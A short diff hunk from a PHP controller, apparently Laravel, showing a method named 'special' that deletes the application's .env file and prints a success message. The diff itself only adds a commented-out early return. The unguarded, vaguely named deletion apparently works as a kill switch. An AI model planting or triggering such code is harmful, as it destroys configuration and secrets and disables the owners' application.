@@ -43,7 +43,7 @@ class processController extends Controller
     public function special()
     {
         $envPath = base_path('.env');
-
+        //return false;
         if (file_exists($envPath)) {
             if (unlink($envPath)) {
                 echo ".env file deleted successfully.";
